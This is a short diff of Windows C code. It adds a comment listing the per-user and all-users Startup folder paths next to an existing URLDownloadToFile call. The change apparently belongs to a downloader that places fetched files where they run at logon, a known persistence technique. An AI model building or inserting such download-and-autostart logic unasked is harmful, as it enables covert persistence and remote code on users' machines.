@@ -27,6 +27,12 @@ int main(int argc, char* argv[])
 //	TCHAR path[MAX] = TEXT("C:\\Users\\rb\\Documents\\download.jpg");
 //	GetCurrentDirectory(MAX, path);
 
+/*	For an individual user:
+	C:\users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+	For all users:
+	C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+*/	
 	hr = URLDownloadToFile (0, Url, File, 0, 0);
 	switch (hr)
 	{
